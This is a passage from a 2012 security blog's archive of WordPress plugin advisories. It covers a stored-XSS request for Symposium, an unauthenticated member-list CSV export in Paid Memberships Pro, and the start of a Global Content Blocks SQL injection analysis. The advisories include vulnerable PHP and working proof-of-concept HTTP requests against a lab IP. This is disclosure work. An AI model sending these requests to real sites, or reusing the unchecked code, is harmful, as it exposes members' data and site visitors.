			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

action=import_template_file&amp;import_file=&lt;!-- template_forum_header --&gt;           &lt;script&gt;alert(document.cookie); &lt;/script&gt;           &lt;!-- end_template_forum_header --&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68bde342484334-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bde342484334-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68bde342484334-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bde342484334-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68bde342484334-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bde342484334-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68bde342484334-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bde342484334-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a68bde342484334-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bde342484334-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">167</span></div><div class="crayon-line" id="crayon-53c9878a68bde342484334-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bde342484334-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">import_template_file</span><span class="crayon-o">&amp;</span><span class="crayon-v">import_file</span><span class="crayon-o">=</span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-e">template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-i">end_template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/symposium/" rel="tag">Symposium</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/#respond" title="Comment on WordPress Symposium plugin multiple stored XSS vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-26 -->

				
					
<article id="post-56" class="post-56 post type-post status-publish format-standard hentry category-advisories tag-paid-memberships-pro tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/" title="5:24 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-13T17:24:39+00:00" pubdate>July 13, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/" title="Permalink to WordPress Paid Memberships Pro information disclosure vulnerability" rel="bookmark">WordPress Paid Memberships Pro information disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49630/">Secunia Advisory SA 49630</a></p>
<p><strong>Analysis of vulnerability</strong><br />
The page <a href="http://plugins.svn.wordpress.org/paid-memberships-pro/tags/1.4.8/adminpages/memberslist-csv.php">/adminpages/memberslist-csv.php</a> is called through AJAX from admin pages, in order to export a CSV list of paid members on the WordPress site. It sets itself up like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69466887592680" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//this file is launched via AJAX to get various data from the DB for the stranger_products plugin

//wp includes
define('WP_USE_THEMES', false);
require('../../../../wp-load.php');

//get users	
if(isset($_REQUEST['s']))
	$s = $_REQUEST['s'];
else
	$s = "";

if(isset($_REQUEST['l']))
	$l = $_REQUEST['l'];
else
	$l = false;

//some vars for the search
if(!empty($_REQUEST['pn']))
	$pn = $_REQUEST['pn'];
else
	$pn = 1;

if(!empty($_REQUEST['limit']))
	$limit = $_REQUEST['limit'];
else
	$limit = false;

if($limit)
{	
	$end = $pn * $limit;
	$start = $end - $limit;		
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69466887592680-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-6">6</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-8">8</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-10">10</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-12">12</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-14">14</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-16">16</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-18">18</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-20">20</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-22">22</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-24">24</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-26">26</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-28">28</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-30">30</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69466887592680-32">32</div><div class="crayon-num" data-line="crayon-53c9878a69466887592680-33">33</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69466887592680-1"><span class="crayon-c">//this file is launched via AJAX to get various data from the DB for the stranger_products plugin</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69466887592680-3"><span class="crayon-c">//wp includes</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-4"><span class="crayon-e">define</span><span class="crayon-sy">(</span><span class="crayon-s">'WP_USE_THEMES'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-5"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69466887592680-7"><span class="crayon-c">//get users&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-8"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'s'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'s'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-10"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-12">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69466887592680-13"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'l'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'l'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-15"><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-17">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-18"><span class="crayon-c">//some vars for the search</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-19"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">empty</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'pn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'pn'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-21"><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-24"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">empty</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'limit'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">limit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'limit'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-26"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">limit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-28">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69466887592680-29"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-30"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-e ">pn *</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69466887592680-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a69466887592680-33"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p>Due to a lack of validation that the user is logged in and has sufficient rights to do so, we can simply request this page and get a full list of paid members on the blog.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69476897322855" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/paid-memberships-pro/adminpages/memberslist-csv.php HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69476897322855-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69476897322855-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69476897322855-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">paid</span><span class="crayon-o">-</span><span class="crayon-i">memberships</span><span class="crayon-o">-</span><span class="crayon-i">pro</span><span class="crayon-o">/</span><span class="crayon-i">adminpages</span><span class="crayon-o">/</span><span class="crayon-i">memberslist</span><span class="crayon-o">-</span><span class="crayon-v">csv</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69476897322855-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/paid-memberships-pro/" rel="tag">Paid Memberships Pro</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/#respond" title="Comment on WordPress Paid Memberships Pro information disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-56 -->

				
					
<article id="post-37" class="post-37 post type-post status-publish format-standard hentry category-advisories tag-global-content-blocks tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="12:01 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-12T12:01:22+00:00" pubdate>July 12, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="Permalink to WordPress Global Content Blocks multiple vulnerabilities" rel="bookmark">WordPress Global Content Blocks multiple vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49854/">Secunia Advisory SA 49854</a></p>
<p><strong>Analysis of gcb_ajax_add.php vulnerability</strong><br />
A part of the admin interface for this plugin allows you to insert a &#8220;content block&#8221;, which can be used across WordPress to contain reusable blocks of content and PHP code. It does so by making a POST call to <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcb_ajax_add.php">/resources/tinymce/gcd_ajax_add.php</a>. Let&#8217;s have a quick look at that to see how it works.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69a8a525589573" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../../../../../wp-load.php');
global $wpdb;

if(!isset($_POST["name"]) || !isset($_POST["content"])) {die("invalid call!");}

$name = $_POST["name"];
$description = mysql_real_escape_string(htmlspecialchars($_POST['description']));
$type = mysql_real_escape_string(htmlspecialchars($_POST['type']));
$value = mysql_real_escape_string(htmlspecialchars($_POST['content']));

if(!strlen($name) || !strlen($value)) {die("invalid call!");}

$available_types = array(
            "other"=&gt;array("vname"=&gt;"General","img"=&gt;"gcb.png","help"=&gt;"Content block"),
            "adsense"=&gt;array("vname"=&gt;"Adsense","img"=&gt;"adsense.png","help"=&gt;"Adsense code"),
            "code"=&gt;array("vname"=&gt;"Code","img"=&gt;"code.png","help"=&gt;"Programming code"),
            "form"=&gt;array("vname"=&gt;"Form","img"=&gt;"form.png","help"=&gt;"General form"),
            "html"=&gt;array("vname"=&gt;"HTML","img"=&gt;"html.png","help"=&gt;"Raw HTML code"),
            "iframe"=&gt;array("vname"=&gt;"Iframe","img"=&gt;"iframe.png","help"=&gt;"Iframe code"),
            "optin"=&gt;array("vname"=&gt;"Opt-In Form","img"=&gt;"optin.png","help"=&gt;"Opt-In form code"),
            "php"=&gt;array("vname"=&gt;"PHP Code","img"=&gt;"php.png","help"=&gt;"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"),
        );

$wpdb-&gt;query("insert into ".$wpdb-&gt;prefix . "gcb (name,description,value,type) VALUES ('".$name."','".$description."','".$value."','".$type."')");

$inserted_id = mysql_insert_id();

$return = array(
"id"=&gt;$inserted_id,
"name"=&gt;$name,
"img"=&gt;$available_types[$type]["img"]
);

echo json_encode($return);die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-6">6</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-8">8</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-10">10</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-12">12</div><div class="crayon-num" 